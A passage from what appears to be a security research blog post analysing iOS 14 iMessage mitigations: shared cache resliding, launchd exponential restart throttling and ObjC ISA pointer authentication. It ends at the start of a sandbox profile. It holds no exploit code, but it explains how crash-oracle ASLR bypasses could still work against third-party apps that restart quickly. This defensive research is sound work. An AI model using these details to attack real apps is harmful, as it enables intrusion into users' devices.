address.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;The result of this is that whenever an attacker attempts to use a crash-oracle to break ASLR, the attacked service would receive a different shared cache region every time it is launched, thus preventing the attack from succeeding. For the time being, this feature appears to &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/kern/kern_exec.c#L205"&gt;only be active on iOS&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;though&lt;/span&gt;&lt;span class="c2"&gt;, but it would be expected to come to macOS as well.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;While this mechanism would in principle also protect 3rd party apps from similar attacks, protection for those is currently somewhat weaker, likely in order to first evaluate the real-world performance impact of this change (the shared cache is a significant performance optimization of the OS). In particular, step 3 is currently only performed if the crashing process is a &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://developer.apple.com/documentation/endpointsecurity/es_process_t/3228979-is_platform_binary"&gt;platform binary&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(essentially binaries that ship with the OS and are directly signed by Apple) such as the services handling iMessages. However, for 3rd party processes, it would only happen if the global &lt;/span&gt;&lt;span class="c7 c6"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/kern/kern_exec.c#L217"&gt;vm_shared_region_reslide_restrict&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;is set to zero:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp;* Flag to control what processes should get shared cache randomize resliding&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp;* after a fault in the shared cache region:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp;* 0 - all processes get a new randomized slide&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp;* 1 - only platform processes get a new randomized slide&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Which is &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/kern/kern_exec.c#L6397"&gt;controlled by the &lt;/a&gt;&lt;/span&gt;&lt;span class="c7 c6"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/kern/kern_exec.c#L6397"&gt;vm_shared_region_reslide_restrict&lt;/a&gt;&lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/kern/kern_exec.c#L6397"&gt;&amp;nbsp;bootarg&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. This currently seems to be set to one. In essence, for 3rd party apps this means:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c15 lst-kix_aue93cd1tacp-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;When the attacked process first crashes, the kernel will still set the &lt;/span&gt;&lt;span class="c6"&gt;OS_REASON_FLAG_SHAREDREGION_FAULT&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag, and &lt;/span&gt;&lt;span class="c6"&gt;launchd&lt;/span&gt;&lt;span&gt;&amp;nbsp;will add the &lt;/span&gt;&lt;span class="c6"&gt;ReslideSharedCache&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;property, but the current reslided region won&amp;rsquo;t be invalidated&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;The restarted service is then restarted and now uses the &amp;ldquo;reslided&amp;rdquo; shared cache region&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;When the service crashes the next time, and if that service is the only one currently using the reslided shared cache region (which should usually be the case, but could possibly be influenced by the attacker), the region&amp;rsquo;s refcount drops to zero, and the shared cache region is marked for removal.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;However, removal will only actually happen &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/osfmk/vm/vm_shared_region.c#L144"&gt;after two minutes&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. As such, if the service is restarted within two minutes, it will receive the same shared cache region at the same location in memory.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;As a result, a third-party app could still be attacked through a crash-oracle technique if it automatically sends some form of delivery receipt to the sender and restarts quickly enough after a crash. This could, however, be prevented for example by enabling &lt;/span&gt;&lt;span class="c6"&gt;ExponentialThrottling&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;for these services. Ideally, and assuming that the performance penalty is reasonable, Apple would enable re-randomization for all apps in the future.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13" id="h.g73ammr1eqa3"&gt;&lt;span class="c5"&gt;Exponential Throttling&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span&gt;Another thing we suggested back in 2019 was to limit the number of attempts an attacker gets when attempting to exploit a vulnerability. This was mostly important to defend against the crash-oracle technique, but would also help to prevent brute force attacks (e.g., given enough attempts, one could simply brute force the location of the shared cache region).&lt;/span&gt;&lt;span class="c18"&gt;&amp;nbsp;The new ExponentialThrottling feature in &lt;/span&gt;&lt;span class="c6 c18"&gt;launchd&lt;/span&gt;&lt;span class="c2 c18"&gt;&amp;nbsp;seems to achieve just that.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2 c18"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c18"&gt;To use it, a system daemon or agent has to opt-in by setting&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&amp;quot;_ExponentialThrottling = 1&amp;rdquo; in its Info.plist (essentially the service metadata), as can be seen below for the BlastDoor service:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; plutil -p /System/Library/PrivateFrameworks/MessagesBlastDoorSupport.framework/Versions/A/XPCServices/MessagesBlastDoorService.xpc/Contents/Info.plist&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;CFBundleDisplayName&amp;quot; =&amp;gt; &amp;quot;MessagesBlastDoorService&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;CFBundleExecutable&amp;quot; =&amp;gt; &amp;quot;MessagesBlastDoorService&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;CFBundleIdentifier&amp;quot; =&amp;gt; &amp;quot;com.apple.MessagesBlastDoorService&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;XPCService&amp;quot; =&amp;gt; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c19 c29"&gt;&amp;nbsp; &amp;nbsp; &amp;quot;_ExponentialThrottling&amp;quot; =&amp;gt; 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Apart from the BlastDoor service, it is also used for imagent:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; plutil -p /System/Library/LaunchAgents/com.apple.imagent.plist&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;_ExponentialThrottling&amp;quot; =&amp;gt; 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;but doesn&amp;rsquo;t appear to be used for any other service, as can, for example, be seen by looking at the output of the &lt;/span&gt;&lt;span class="c6"&gt;launchctl dumpstate&lt;/span&gt;&lt;span&gt;&amp;nbsp;command, which will only show &amp;ldquo;&lt;/span&gt;&lt;span class="c6"&gt;exponential throttling = 1&amp;rdquo;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for &lt;/span&gt;&lt;span class="c6"&gt;com.apple.imagent&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;com.apple.MessagesBlastDoorService.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Presumably, the &lt;/span&gt;&lt;span class="c6"&gt;_ExponentialThrottling&lt;/span&gt;&lt;span&gt;&amp;nbsp;property instructs launchd (the macOS and iOS init process), to delay subsequent restarts of a crashing service. While it is somewhat challenging to statically reverse engineer launchd due to the lack of source code or binary symbols, it is fortunately fairly easy to experimentally determine the impact of the &lt;/span&gt;&lt;span class="c6"&gt;_ExponentialThrottling&lt;/span&gt;&lt;span&gt;&amp;nbsp;property, for example by installing a custom daemon that writes the current timestamp to a file before crashing. By default, so &lt;/span&gt;&lt;span class="c25"&gt;without&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;ExponentialThrottling, one would see the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 13:56:03 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 13:56:13 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 13:56:23 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 13:56:33 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;As can be seen, by default, a service is, at the earliest, restarted ten seconds after it was previously started. However, using the following service plist which enables ExponentialThrottling:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; # Start service with&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; # launchctl bootstrap system /Library/LaunchDaemons/net.saelo.test.plist&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; plutil -p /Library/LaunchDaemons/net.saelo.test.plist&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;_ExponentialThrottling&amp;quot; =&amp;gt; 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;KeepAlive&amp;quot; =&amp;gt; 1&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;Label&amp;quot; =&amp;gt; &amp;quot;net.saelo.test&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;POSIXSpawnType&amp;quot; =&amp;gt; &amp;quot;Interactive&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;quot;Program&amp;quot; =&amp;gt; &amp;quot;/path/to/program&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;One can observe the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:42:43 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:42:53 2021 (+10s)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:43:03 2021 (+10s)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:43:13 2021 (+10s)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:43:33 2021 (+20s)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:44:13 2021 (+40s)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:45:33 2021 (+80s)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:48:13 2021 (+160s [~2.5m])&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 10:53:33 2021 (+320s [~5m])&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 11:04:13 2021 (+640s [~10m])&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 11:24:13 2021 (+20m)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 11:44:13 2021 (+20m)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Service started on Wed Jan &amp;nbsp;6 12:04:13 2021 (+20m)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Here, the exponential increase in the time between subsequent restarts is clearly visible, and goes up to an apparent maximum of 20 minutes. And indeed, &lt;/span&gt;&lt;span class="c6"&gt;launchd&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;does contain the following bit of code in a function presumably responsible for computing the next restart delay (search for XREFs to the string &amp;quot;%s: service throttled by %llu seconds&amp;quot;):&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; if ( delay &amp;gt;= 1200 )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; result = 1200LL; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// 20 minutes&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; else&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; result = delay;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;With this change, an exploit that relied on brute force would now only get one attempt every 20 minutes instead of every 10 seconds.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13" id="h.mfarwae35i5h"&gt;&lt;span class="c5"&gt;(Upcoming?) ObjectiveC ISA PAC&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span&gt;The PoC exploit against iMessage on iOS 12.4 relied heavily on faking ObjectiveC objects to gain a form of arbitrary code execution despite the presence of &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://support.apple.com/guide/security/pointer-authentication-codes-seca5759bf02/web"&gt;pointer authentication (PAC)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This was mainly possible because the ISA field, containing the pointer to the Class object and thus making a piece of memory appear like a valid ObjectiveC object, was not protected through PAC and could thus be faked. With iOS 14, this now seems to be changing: while previously, the &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/opensource-apple/objc4/blob/cd5e62a5597ea7a31dccef089317abb3a661c154/runtime/objc-private.h#L93"&gt;top 19 bits of the ISA value contained the inline refcount&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, it now appears that this field has been reduced to 9 bits (of which the LSB appears to be reserved for some purpose, leaving an &lt;/span&gt;&lt;span&gt;8-bit inline refcount&lt;/span&gt;&lt;span&gt;, see the bit shifting logic in &lt;/span&gt;&lt;span class="c6"&gt;objc_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c6"&gt;objc_retain&lt;/span&gt;&lt;span&gt;), while the freed-up bits now hold a PAC, as can be seen in &lt;/span&gt;&lt;span class="c6"&gt;objc_rootAllocWithZone&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;in libobjc.dylib:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6 c12 c19"&gt;&amp;nbsp; &amp;nbsp; ; Allocate the object&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; BL &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;j__calloc_3&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; CBZ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X0, loc_1953DA434&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; MOV &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X8, X0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c19 c6 c12"&gt;&amp;nbsp; &amp;nbsp; ; &amp;ldquo;Tag&amp;rdquo; the address with a constant to get a PAC modifier value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; MOVK &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;X8, #0x6AE1,LSL#48 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; MOV &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X9, X19&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c19 c6 c12"&gt;&amp;nbsp; &amp;nbsp; ; Compute PAC of Class pointer with tagged object address as modifier&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; PACDA &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X9, X8 &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c12"&gt;; Clear top 9 bits (inline refcnt) and bottom 3 bits (other bitfields)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; AND &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X8, X9, #0x7FFFFFFFFFFFF8&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c19 c6 c12"&gt;; Set LSB and inline refcount to one&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; MOV &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X9, #0x100000000000001&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; ORR &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X9, X8, X9&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6 c12"&gt;&amp;nbsp; &amp;nbsp; ; Presumably, the refcnt isn&amp;rsquo;t used for all types of classes...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; TST &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; W20, #0x2000&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6 c12"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0"&gt;CSEL &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;X8, X9, X8, EQ&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c19 c6 c12"&gt;; Store the resulting value into the ISA field&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; STR &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; X8, [X0]&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;However, currently the ISA PAC appears to never be checked, as such, it doesn&amp;rsquo;t yet affect any exploits. The most likely reason for this is that the ISA PAC feature is being rolled out in multiple phases, with the current implementation meant to allow in-depth performance evaluation, in particular of the reduced size of the inline refcount, which will likely cause more objects to use the more expensive out-of-line refcounting (used &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/opensource-apple/objc4/blob/cd5e62a5597ea7a31dccef089317abb3a661c154/runtime/objc-object.h#L392"&gt;once the inline refcount saturates&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). With that, it can be expected that, in the absence of major performance issues, future releases of iOS and macOS will use PAC for the ObjC ISA field, thus likely breaking exploits that have to rely on faking ObjectiveC objects to achieve arbitrary code execution.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13" id="h.hdmcsd8tb0pt"&gt;&lt;span class="c5"&gt;Conclusion&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;This blog post discussed three improvements in iOS 14 affecting iMessage security: the BlastDoor service, resliding of the shared cache, and exponential throttling. Overall, these changes are probably very close to the best that could&amp;rsquo;ve been done given the need for backwards compatibility, and they should have a significant impact on the security of iMessage and the platform as a whole. It&amp;rsquo;s great to see Apple putting aside the resources for these kinds of large refactorings to improve end users&amp;rsquo; security. Furthermore, these changes also highlight the value of offensive security work: not just single bugs were fixed, but instead structural improvements were made based on insights gained from exploit development work.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;As for the alleged NSO iMessage exploit, it may have been prevented from working against iOS 14 by any of the following&lt;/span&gt;&lt;span class="c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c15 lst-kix_ju6nxsiwjdzc-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;The bug was fixed in iOS 14, for example due to the rewrite of large parts of the iMessage processing pipeline in Swift&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style="padding: 0;" class="c15 lst-kix_u10h5r66zlog-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;The mere fact that processing happens in a different process, which could for example break a heap layouting primitive&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;The shared cache resliding would break their exploit if their exploit relied on some form of crash oracle to break ASLR&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;The stronger sandbox of the BlastDoor service, which could prevent the exploitation of a privilege escalation vulnerability after compromising the BlastDoor process&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;While these are some possible scenarios, and &lt;/span&gt;&lt;span class="c2"&gt;it could be the case that the exploit &amp;ldquo;just&amp;rdquo; needs some re-engineering to function again, the fact that these security improvements were shipped is certainly a positive outcome.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13" id="h.4kqlsylg7dt0"&gt;&lt;span&gt;Attachment 1: blastdoor.sb&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; This profile contains the rules necessary to make BlastDoor as close to&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; compute-only as possible, while still remaining functional.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;;&lt;/span&gt;&lt;/p&gt; &lt;p 